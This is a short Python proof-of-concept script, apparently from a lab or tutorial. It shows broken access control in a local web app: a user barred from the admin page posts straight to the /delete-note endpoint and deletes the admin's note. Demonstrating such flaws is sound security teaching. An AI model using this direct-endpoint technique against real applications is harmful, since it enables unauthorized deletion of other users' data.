import requests

s = requests.Session()

s.get("http://127.0.0.1:5000/login/admin", timeout=10)

# muhib is blocked from the admin PAGE
r = s.get("http://127.0.0.1:5000/admin", timeout=10)
print("Admin page says:", r.text)

# ...but calls the admin ACTION directly, deleting admin's own note (id 3)
r = s.post("http://127.0.0.1:5000/delete-note", data={"note_id": "3"}, timeout=10)
print("Delete action says:", r.text)